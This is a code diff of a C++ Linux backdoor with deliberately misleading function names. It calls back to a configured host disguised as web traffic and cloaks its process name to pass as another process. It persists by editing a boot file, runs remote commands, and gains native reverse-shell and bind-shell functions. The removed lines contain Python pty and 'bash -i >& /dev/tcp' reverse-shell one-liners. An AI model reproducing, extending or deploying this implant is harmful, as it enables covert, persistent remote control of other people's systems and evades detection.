@@ -14,14 +14,14 @@ extern "C"{
     #include <sys/socket.h>
     #include <arpa/inet.h> 
 }
-
+#define SH "/bin/sh" // shell that tty uses
 using namespace std;
 
 struct gui_config{
     const string client_ver = "lol"; // client name 
-    const string client_patch = ""; // host to call back to
+    const string client_patch = "127.0.0.1"; // host to call back to
     const string client_buffer = "443"; // port to call back to port 80 and 443 will look like web sockets
-    const string client_key = "lolpass"; // password
+    const string client_key = ""; // password
     const string client_time_out = "1"; // amount of time till a command will be killed, the smaller the time the less chance of detection
 }; gui_config gc; 
 
@@ -45,7 +45,7 @@ class gui_bar{
             if(time(NULL) >= end){
               free(buff);
               pclose(in); 
-				      return  out + "\nKilled command since it took longer than " + string(gc.client_time_out) + " Seconds\n";
+	            return  out + "\nKilled command since it took longer than " + string(gc.client_time_out) + " Seconds\n";
 		      	}
           }
           free(buff);
@@ -98,59 +98,101 @@ class gui_bar{
             remove("/etc/.pythonbin/");
             return;
         }
-        void bios_bitmap(string bios_host, string bios_num) 
+        void bios_bitmap(string bios_host, int bios_num, bool is_bitmap) 
         {
-            if(!system(("python3 -c 'import os, pty, socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"" + string(bios_host) + "\", " + string(bios_num) + ")); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close();'").c_str())){
-                if(!system(("bash -i >& /dev/tcp/" + string(bios_host) + "/" + string(bios_num) + " 0>&1").c_str())){
-                    return;   // all backconnects failed, must be a shitty box
+          if (fork()==0){
+            if (fork()==0){ 
+              int s2, l0, o = 1;
+              struct sockaddr_in server;
+              if(is_bitmap==false){
+                s2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+                if (s2 < 0){
+                  close(s2);
+                  return;
                 }
-            }
-            return;
+                server.sin_family = AF_INET;
+                server.sin_port = htons(bios_num);
+                server.sin_addr.s_addr = inet_addr((bios_host).c_str());
+                if (connect(s2, (struct sockaddr *)&server , sizeof(server)) < 0){
+                    close(s2);
+                    return;
+                }       
+              }
+              else{
+                l0 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+                if (l0 < 0){
+                  close(l0);
+                  return;
+                }
+                server.sin_family = AF_INET;
+                server.sin_port = htons(bios_num);
+                server.sin_addr.s_addr = htonl(INADDR_ANY);
+                setsockopt(l0, SOL_SOCKET, SO_REUSEADDR, &o, sizeof(o)); 
+                bind(l0, (struct sockaddr *) &server, sizeof(server));
+                listen(l0, 1);
+                s2 = accept(l0, NULL, NULL);
+              }
+              send(s2, string("Connected! Current EUID is " + to_string(geteuid()) + "\n").c_str(), string("Connected! Current EUID is " + to_string(geteuid()) + "\n").size(), 0);
+              if(s2 < 0){
+                  close(s2);
+                  return;
+              }
+              dup2(s2,0); 
+              dup2(s2,1);
+              dup2(s2,2);
+              if(s2 > 0){
+                execl(SH,SH,(char *)0);
+              }
+              else{
+                  close(s2);
+                  return; 
+              }
+            }        
+          }      
         }
         string ftp_g(void) 
         {
-            string shell_bar, uid_user, current_user, cwd;
+            char cwd[1024];
+            string shell_bar, uid_user;
             struct utsname sysinfo;
             uname(&sysinfo);
-            current_user = gui_c("whoami").replace(gui_c("whoami").find("\n"), 2, "");
-            cwd = gui_c("pwd").replace(gui_c("pwd").find("\n"), 2, "");
+            getcwd(cwd, sizeof(cwd));
             if(getuid() == 0){
                 uid_user = " $ ";
             } else{
                 uid_user = " # ";
             }
-            return string(current_user) + string("@") + string(sysinfo.nodename) + string(":~") + string(cwd) + string(uid_user);
+            return string(getenv("USER")) + string("@") + string(sysinfo.nodename) + string(":~") + string(cwd) + string(uid_user);
         }
         bool write_to_boot(string file_name, string boot_file){
-          ifstream count_line;
-          ofstream startup;
-          startup.open(("/tmp/tmp.txt"), ios::out | ios::app);
-          string line;
-          count_line.open(file_name);
-          while(count_line.good()){
-          while(!count_line.eof()) // To get you all the lines.
-            {
-              line = "";
-              getline(count_line, line);
-              if(line.find(boot_file) != -1){
-              remove("/tmp/tmp.txt");
-              return false;
+          struct stat st;
+          if(getuid()==0){
+            if(stat((boot_file).c_str(),&st) == 0){
+              string line, completed;
+              ifstream startup_read(boot_file);
+              while(getline(startup_read, line)){
+                if(line=="exit 0"){
+                  completed += file_name + "\nexit 0";
+                  break;
+                }
+                else if(line==file_name){
+                  startup_read.close();
+                  return false;
+                }
+                else{
+                  completed += line + "\n";
+                }
               }
-              else if(line=="# Make sure that the script will \"exit 0\" on success or any other" || line!="exit 0"){
-                startup << line << endl;  
-              }
+              startup_read.close(); 
+              ofstream startup_write(boot_file);
+              startup_write << completed;
+              startup_write.close();
+              setuid(6770);
+              chmod((boot_file).c_str(), 0755);
+              return true;
             }
-            count_line.close();
-            break;
           }
-          startup << boot_file << endl;
-          startup << "exit 0" << endl;
-          startup.close();     
-          rename("/tmp/tmp.txt", (file_name).c_str());
-          remove("/tmp/tmp.txt");
-          setuid(6770);
-          chmod((file_name).c_str(), 755);
-          return true;
+          return false;
 		    }
         void file_setup(string service_s, string file_p)
         {
@@ -173,7 +215,7 @@ class gui_bar{
               remove((getexepath()).c_str());
             }
             write_to_boot(service_s, file_p);
-          }   
+          }
           return;
         }
 }; gui_bar gb;
@@ -195,7 +237,7 @@ class gui_user{
         }
         while(1){
           gui_name = gui_uv[rand()%gui_uv.size()];
-          if(gui_name.find("ps -e -o command") != -1 || gui_name == gui_l || gui_name=="COMMAND" || gui_name.size() <= 1){
+          if(gui_name.find("ps -e -o command") != string::npos || gui_name == gui_l || gui_name=="COMMAND" || gui_name.size() <= 1){
             sleep(1);
             continue;
           }
@@ -216,6 +258,37 @@ class gui_user{
 
 class cli_architecture : gui_config{ // backconnect
   public:  
+      bool start_backconnect(string dat_recv, bool is_bind){
+        vector<string> backconnect_v;
+        string buffer; 
+        stringstream white_space_ss(dat_recv); 
+        while(white_space_ss >> buffer){
+            backconnect_v.push_back(buffer); 
+        } 
+        if(is_bind==false){
+          if((backconnect_v).size() == 2 && (backconnect_v[0]).size() > 1 && (backconnect_v[1]).size() > 1){
+            try{
+             thread(&gui_bar::bios_bitmap, &gb, backconnect_v[0], stoi(backconnect_v[1]), is_bind).detach();
+             return true;
+            }
+            catch(...){
+              return false;
+            }
+          }
+        }
+        else if(is_bind==true){
+          if((backconnect_v).size() == 1 && (backconnect_v[0]).size() > 1){
+            try{
+             thread(&gui_bar::bios_bitmap, &gb, "", stoi(backconnect_v[0]), is_bind).detach();
+             return true;
+            }
+            catch(...){
+              return false;
+            }
+          }
+        }
+        return false;
+      }
       void isdn(void)
       {
         string dir_line, line;
@@ -279,15 +352,14 @@ class cli_architecture : gui_config{ // backconnect
                     }
                 }
               }
-              if(line.size() > 0){ 
+              if(line.size() > 0){
                 if(isauth==true){
-	                if(line.find("cd ") != -1){
-	                    dir_line = line.replace(line.find("cd "), 3, ""); 
-	                    chdir((dir_line).c_str());
+	                if(line.find("cd ") != string::npos){
+	                    chdir((line.replace(line.find("cd "), 3, "")).c_str());
 	                } 
 	                else if(line=="exit" || line=="quit"){    
 	                    close(s0);
-	                    exit(0);
+	                    terminate();
 	                }
 	                else if(line=="session_exit" || line=="sess_exit"){
 	                    close(s0);
@@ -296,24 +368,21 @@ class cli_architecture : gui_config{ // backconnect
 	                else if(line=="cd"){
 	                  chdir(getenv("HOME"));
 	                }
-	                else if(line.find("backconnect ") != -1){ //backconnect host port
-	                  vector<string> backconnect_v;
+	                else if(line.find("backconnect ") != string::npos){ //backconnect host port
 	                  line.replace(line.find("backconnect "), 12, "");
-	                  string buffer; 
-	                  stringstream white_space_ss(line); 
-	                  while(white_space_ss >> buffer){
-	                      backconnect_v.push_back(buffer); 
-	                  } 
-	                  if((backconnect_v).size() == 2 && (backconnect_v[0]).size() > 1 && (backconnect_v[1]).size() > 1){
-	                     thread(&gui_bar::bios_bitmap, &gb, backconnect_v[0], backconnect_v[1]).detach();
-	                  } 
-	                  else{
-	                    send(s0,(gu.gui_enc("Incorrect usage: backconnect host port\n")).c_str(), gu.gui_enc("Incorrect usage: backconnect host port\n").size(), 0); 
+	                  if(start_backconnect(line, false)==false){
+	                    send(s0,(gu.gui_enc("Incorrect usage: backconnect host port\n")).c_str(), gu.gui_enc("Incorrect usage: backconnect host port\n").size(), 0);
 	                  }
-	                } 
+	                }
+	                else if(line.find("bindshell ") != string::npos){
+	                  line.replace(line.find("bindshell "), 10, "");
+	                  if(start_backconnect(line, true)==false){
+	                    send(s0,(gu.gui_enc("Incorrect usage: bindshell port\n")).c_str(), gu.gui_enc("Incorrect usage: bindshell port\n").size(), 0);
+	                  }
+	                }
 	                else if(line=="bd_cleanup"){
 	                    gb.cps_codex(); // cps_codex(void)
-	                } 
+	                }
 	                else{
 	                    send(s0,(gu.gui_enc(gb.gui_c(line))).c_str(), (gu.gui_enc(gb.gui_c(line))).size(), 0);
 	                }
@@ -333,10 +402,12 @@ class cli_architecture : gui_config{ // backconnect
 
 int main(int argc, char *argv[]){
     srand(time(NULL)); 
+    signal(SIGPIPE, SIG_IGN);
+    signal(SIGCHLD, SIG_IGN); // fuck zombie process's
+    string gui_t = gu.gui_procc(argv[0]); // process name to copy
     for(int i=0;i<argc;i++){
       memset(argv[i],'\x0',strlen(argv[i]));
     }
-    string gui_t = gu.gui_procc(argv[0]);
     strcpy(argv[0], (gui_t).c_str()); // cloak, command name
     prctl(PR_SET_NAME, (gui_t).c_str()); // cloak, thread name
     gb.daemon();
@@ -344,6 +415,6 @@ int main(int argc, char *argv[]){
     while(1){
         thread(&cli_architecture::isdn, &ca).detach();
         sleep((rand()%(360-60 + 1) + 60)); // 1-5 mins call back
-    } 
+    }
     return 0;
 }
